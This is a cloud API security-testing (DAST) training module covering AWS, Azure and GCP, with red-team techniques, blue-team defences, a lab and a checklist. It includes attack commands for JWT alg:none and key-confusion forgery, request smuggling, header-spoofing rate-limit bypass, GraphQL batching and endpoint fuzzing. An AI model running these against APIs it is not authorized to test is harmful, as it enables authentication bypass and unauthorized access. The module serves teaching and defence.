# 10 — API Security Testing (DAST)

> **Level:** Intermediate
> **Prereqs:** [API Gateway and Edge Patterns](api-gateway-and-edge-patterns.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Initial Access, Credential Access, Discovery, Execution
> **Authorization scope:** Run only against your own APIs in sandbox environments. Never run automated scanners or fuzzers against production without explicit authorization and maintenance windows.

## What & why

Dynamic Application Security Testing (DAST) for cloud-hosted APIs identifies runtime vulnerabilities — broken auth, injection, misconfigured CORS, undocumented endpoints, and rate-limit bypasses — by probing the running API just as an attacker would. Static analysis cannot see misconfigured API gateways, overly broad IAM role trusts, or JWT validation logic flaws. DAST catches what SAST misses at the HTTP/API boundary.

## The OnPrem reality

On-prem API testing was fragmented: SoapUI for SOAP, manual curl scripts for REST, and network scanners (Nessus, Qualys) that treated APIs as web applications. No standardized toolchain existed for GraphQL introspection abuse, JWT manipulation, or cloud-IAM→API integration testing. Cloud-native APIs add layers (API Gateway, Lambda authorizers, Cognito/JWT validators) that require cloud-aware DAST tooling.

## Core concepts

### DAST vs SAST for cloud APIs

| Dimension | SAST (Static) | DAST (Dynamic) |
|---|---|---|
| What it finds | Code-level vulns (SQL injection sinks, hardcoded keys) | Runtime behavior (auth bypass, CORS misconfig, rate limiting) |
| Cloud-specific findings | IAM policy flaws in IaC (overscoped roles) | IAM token handling at runtime (accepts expired tokens) |
| False positives | Higher (unreachable code paths flagged) | Lower (confirmed by observing actual HTTP response) |
| When it runs | Pre-deploy (CI) | Pre-deploy + continuous post-deploy |
| Tools | Semgrep, CodeQL, Checkov | OWASP ZAP, ffuf, nuclei, Postman |

### REST API security testing model

```
Authentication layer:
  ├── Missing auth on endpoints
  ├── Token replay (JWT/subject mismatch)
  ├── Weak signing algorithm (alg:none, HS256 vs RS256)
  └── Token lifetime abuse

Authorization layer:
  ├── BOLA/IDOR (user A accessing user B's resources)
  ├── Role escalation (user role accessing admin endpoint)
  └── Cross-tenant access

Input validation:
  ├── SQL/NoSQL injection in query params
  ├── XXE in XML body
  └── Parameter pollution

Infrastructure / API Gateway:
  ├── CORS misconfiguration (Access-Control-Allow-Origin: *)
  ├── Missing rate limiting
  ├── Undocumented endpoints
  └── API version shadowing
```

## AWS

### Testing API Gateway + Lambda authorizer

```bash
# 1. Probe for undocumented /v2 endpoints
ffuf -u https://api-id.execute-api.us-east-1.amazonaws.com/prod/FUZZ \
  -w /usr/share/wordlists/api-endpoints.txt \
  -H "Authorization: Bearer $(aws cognito-idp initiate-auth ... --query AuthenticationResult.IdToken)"

# 2. Test JWT manipulation on API Gateway with Cognito authorizer
# Decode the JWT, switch from RS256 to HS256, re-sign with the public key
python3 jwt_tool.py <token> -X k -pk public_key.pem

# 3. Test SigV4 forwarding
# Capture a request to API Gateway, modify the resource path to access another API
curl https://api-id.execute-api.us-east-1.amazonaws.com/prod/admin/users \
  -H "Authorization: $(aws4_sign --service execute-api --region us-east-1)"

# 4. Test for IAM authorization bypass
# API Gateway with IAM authorizer but overly broad resource policy
aws apigateway get-rest-api --rest-api-id abc123
# Check resource policy: does it allow "*" principal?
```

**Gotcha:** API Gateway's default throttling (10,000 requests/second per account) protects the gateway but not individual API keys. Test per-key rate limits — attackers will enumerate keys to bypass key-specific throttling.

### Testing GraphQL APIs (AWS AppSync)

```bash
# GraphQL introspection (should be disabled in production)
curl -X POST https://appsync-id.appsync-api.us-east-1.amazonaws.com/graphql \
  -H "Content-Type: application/json" \
  -H "x-api-key: da2-abcdefghijklmnop" \
  -d '{"query":"{__schema {types {name fields {name}}}}"}'

# Depth-limit bypass
# Craft a deeply nested query that escapes depth limits via fragments
curl -X POST ... \
  -d '{"query":"query { user { friends { friends { friends { ... on User { friends { name }}}}}}"}'

# Batching attack — bypass rate limit by sending many queries in one request
curl -X POST ... \
  -d '[{"query":"query { getUser(id:1) { name }}"},{"query":"query { getUser(id:2) { name }}"}]'
```

## Azure

### Testing Azure API Management (APIM) + Entra ID auth

```bash
# 1. Test APIM subscription key bypass (missed "subscription required" setting)
curl https://apim-instance.azure-api.net/gateway/api/users \
  -H "Ocp-Apim-Subscription-Key: 00000000000000000000000000000000"

# 2. Test JWT validation in APIM policy — "alg:none" attack
# APIM validate-jwt policy with missing <required-claims>
python3 jwt_tool.py <token> -X a

# 3. Test IP filter bypass — X-Forwarded-For header manipulation
curl https://apim-instance.azure-api.net/gateway/api/admin \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "Ocp-Apim-Subscription-Key: valid-subscription-key"

# 4. Discover hidden API revisions
curl https://apim-instance.azure-api.net/gateway/api;rev=2/users
```

**Gotcha:** APIM's default CORS policy returns `Access-Control-Allow-Origin: *` if no policy is configured. Always set explicit origin(s).

### Testing Azure Functions with EasyAuth

```bash
# Test EasyAuth token validation — expired token still accepted?
curl https://func-app.azurewebsites.net/api/secret-data \
  -H "Authorization: Bearer <expired-token>" \
  -H "X-MS-CLIENT-PRINCIPAL-ID: admin-user-id"

# Test bypass via App Service Authentication configuration
# If EasyAuth is set to "Allow unauthenticated requests", the endpoint works without a token
curl https://func-app.azurewebsites.net/api/secret-data
```

## GCP

### Testing Cloud Endpoints + Firebase/JWT auth

```bash
# 1. Test Cloud Endpoints ESPv2 JWT validation bypass
curl https://api.endpoints.project-id-111111.cloud.goog/v1/users \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyMTIzIn0."

# 2. Test API key restrictions (Cloud Endpoints allows API key + auth)
curl "https://api.endpoints.project-id.cloud.goog/v1/users?key=AIzaSy..." \
  # Does the API key bypass the JWT requirement?

# 3. Test Apigee API proxy: request smuggling
curl -X POST https://api.apigee.net/v1/users \
  -H "Content-Length: 50" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"
```

**Gotcha:** Cloud Endpoints ESPv2 defaults to allowing API keys as a standalone auth method. If your OpenAPI spec lists both `api_key` and `firebase` security definitions, ESPv2 accepts either — not both.

### Testing Cloud Run + IAM auth

```bash
# Cloud Run service with "Allow unauthenticated" vs "Require authentication"
curl https://service-name.hash-uc.a.run.app/admin
# If 200 without Authorization header: unauthenticated access is enabled → CRITICAL finding

# Test IAM invoker role escalation
# If the service trusts "allAuthenticatedUsers" instead of specific service accounts
gcloud run services get-iam-policy service-name --region us-central1
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| REST API scanning | ZAP / Burp Suite | + API Gateway auth testing | + APIM policy testing | + Cloud Endpoints / Apigee |
| GraphQL testing | InQL (Burp extension) | AppSync introspection + batching | Apollo Server (self-hosted) | Apigee GraphQL |
| Auth testing tool | Postman collections | SigV4 signing libraries | Entra ID token acquisition | gcloud auth print-identity-token |
| Fuzzing | ffuf / wfuzz / gobuster | Same tools against API Gateway URL | Same tools against APIM URL | Same tools against Cloud Endpoints URL |
| Rate-limit test | Apache Bench / wrk | Test per-key + method throttle | Test product+key quota | Test per-endpoint quota |
| DAST in CI | ZAP baseline scan | + `npm run test:api:security` | + `az apim test` | + `gcloud endpoints configs describe` |

## 🔴 Red Team view

### Technique 1 — API fuzzing for undocumented endpoints

```bash
# Generic API fuzzing with ffuf
ffuf -u https://api.target.com/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api_endpoints.txt \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,301,403

# Parameter fuzzing to discover hidden functionality
ffuf -u 'https://api.target.com/v1/users?FUZZ=admin' \
  -w /usr/share/seclists/Discovery/Web-Content/api_params.txt \
  -mc 200

# POST body fuzzing for mass assignment
ffuf -X POST \
  -u https://api.target.com/v1/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","FUZZ":true}' \
  -w /usr/share/seclists/Discovery/Web-Content/api_params.txt
```

### Technique 2 — JWT manipulation chain

```bash
# 1. Check if the API accepts "alg":"none"
python3 jwt_tool.py <token> -X a

# 2. Check for key confusion (HS256 with public key as secret)
# If the server uses RS256 but the library accepts HS256 with the public key as HMAC secret:
python3 jwt_tool.py <token> -X k -pk ./public_key.pem

# 3. Check for "kid" (Key ID) header injection
# Craft a JWT where "kid" points to /dev/null or a predictable file path
python3 jwt_tool.py <token> -X i -I -hc kid -hv "/dev/null"

# 4. Test for missing audience/subject validation
# Use a valid JWT from a different OAuth client — does it work?
curl https://api.target.com/v1/users \
  -H "Authorization: Bearer <jwt-from-different-client>"
```

### Technique 3 — Rate-limit bypass

```bash
# Bypass per-IP rate limiting via IP rotation headers
for ip in $(seq 1 254); do
  curl -H "X-Forwarded-For: 10.0.0.$ip" \
    -H "X-Real-IP: 10.0.0.$ip" \
    https://api.target.com/v1/brute-force-endpoint & 
done

# Bypass per-key rate limiting via key enumeration
for key in "${API_KEYS[@]}"; do
  curl -H "X-API-Key: $key" https://api.target.com/v1/data &
done
```

**Artifacts left:** WAF logs show a surge in requests with varied `X-Forwarded-For` headers. API Gateway access logs show 429 status codes followed by 200s (rate-limit bypass success). CloudTrail/Activity Log shows an unusual spike in API calls from the same User-Agent across many IPs.

## 🔵 Blue Team view

### Pre-production DAST in CI pipeline

```yaml
# GitHub Actions — DAST step in CI pipeline
name: API DAST Scan
on:
  pull_request:
    branches: [main]
jobs:
  zap-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to staging
        run: ./deploy-staging.sh
      - name: OWASP ZAP baseline scan
        uses: zaproxy/action-baseline@v0.12.0
        with:
          target: 'https://staging-api.example.com'
          rules_file_name: '.zap/rules.tsv'
      - name: Custom API auth tests
        run: |
          # Run Postman collection with Newman
          newman run api-security-tests.postman_collection.json \
            --env-var base_url=${{ env.STAGING_URL }} \
            --reporters cli,junit
      - name: Run nuclei against API endpoints
        run: |
          nuclei -u https://staging-api.example.com \
            -t nuclei-templates/http/exposures/apis/ \
            -exclude-severity info
```

### API schema validation

Enforce the API contract at the gateway level — any request that doesn't match the schema is rejected before it reaches the backend:

```yaml
# OpenAPI 3.0 spec with strict validation
openapi: "3.0.3"
info:
  title: Secure API
  version: "1.0"
paths:
  /users/{userId}:
    get:
      parameters:
        - name: userId
          in: path
          required: true
          schema:
            type: string
            pattern: '^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$'
      responses:
        '200':
          description: OK
        '403':
          description: Forbidden
```

```bash
# AWS API Gateway: enable request validation
aws apigateway put-method \
  --rest-api-id abc123 \
  --resource-id xyz789 \
  --http-method GET \
  --request-validator-id validate-body \
  --request-parameters "method.request.querystring.userId=true"

# Azure APIM: validate request against schema in policy
# Configure validate-content policy in the inbound section

# GCP Cloud Endpoints: OpenAPI spec already enforces schema if strict=true
```

### WAF rules for API-specific attacks

```json
// AWS WAF rule — block JWT alg:none
{
  "Name": "BlockJWTNoneAlg",
  "Priority": 1,
  "Action": {"Block": {}},
  "Statement": {
    "ByteMatchStatement": {
      "SearchString": "eyJhbGciOiJub25lIn0",
      "FieldToMatch": {"SingleHeader": {"Name": "authorization"}},
      "TextTransformations": [{"Type": "NONE", "Priority": 0}]
    }
  }
}
```

```bash
# Azure WAF custom rule — GraphQL introspection in production
az network application-gateway waf-policy custom-rule create \
  --policy-name api-waf-policy \
  --resource-group sec-rg \
  --name BlockIntrospection \
  --rule-type MatchRule \
  --action Block \
  --match-conditions "[{\"match_variables\":[{\"variable_name\":\"RequestBody\",\"selector\":\"query\"}],\"operator\":\"Contains\",\"match_values\":[\"__schema\"]}]"
```

## Hands-on lab

1. Deploy a simple REST API using a framework (Express, Flask, or FastAPI) on an EC2 instance or as a Lambda function with API Gateway.

2. Run OWASP ZAP baseline scan:
```bash
# Install ZAP
docker pull zaproxy/zap-stable

# Run baseline scan against your API
docker run -t zaproxy/zap-stable zap-baseline.py \
  -t https://your-api-id.execute-api.us-east-1.amazonaws.com/prod \
  -z "-config api.addrs.addr.name=.* -config api.addrs.addr.regex=true"
```

3. Test for JWT misconfigurations using `jwt_tool`:
```bash
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <your-api-jwt-token> -t https://your-api-url/users -M pb
```

4. Run ffuf for undocumented endpoint discovery:
```bash
ffuf -u https://your-api-url/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
```

5. Run nuclei against the API:
```bash
nuclei -u https://your-api-url -t ~/nuclei-templates/http/exposures/
```

**Teardown:** Delete the deployed API and any test resources. Revoke any test API keys/tokens.

## Detection rules & checklists

**Checklist:**
- [ ] DAST scan runs in CI on every PR that modifies API code.
- [ ] DAST scan runs weekly against staging environment.
- [ ] GraphQL introspection disabled in production (AppSync / Apollo / Hasura).
- [ ] API Gateway/WAF enforces request validation (schema enforcement).
- [ ] JWT validation includes: algorithm check, audience, issuer, expiration, subject.
- [ ] Rate limiting configured per-method and per-client (not just per-IP).
- [ ] CORS configured with explicit origins (no `*`).
- [ ] Undocumented endpoints scan run quarterly.
- [ ] Sensitive endpoints require explicit authorization (no "allow unauthenticated" for admin routes).

## References
- [OWASP ZAP — API Scanning](https://www.zaproxy.org/docs/desktop/addons/openapi-support/)
- [ffuf — Fuzz Faster U Fool](https://github.com/ffuf/ffuf)
- [Nuclei — Fast Vulnerability Scanner](https://github.com/projectdiscovery/nuclei)
- [JWT Tool — JWT Attack Playbook](https://github.com/ticarpi/jwt_tool)
- [AWS API Gateway — Request Validation](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-method-request-validation.html)
- [Azure APIM — Validate Content Policy](https://learn.microsoft.com/en-us/azure/api-management/api-management-policies)
- [GCP Cloud Endpoints — Authentication](https://cloud.google.com/endpoints/docs/openapi/authentication-method)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [MITRE ATT&CK — Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/)
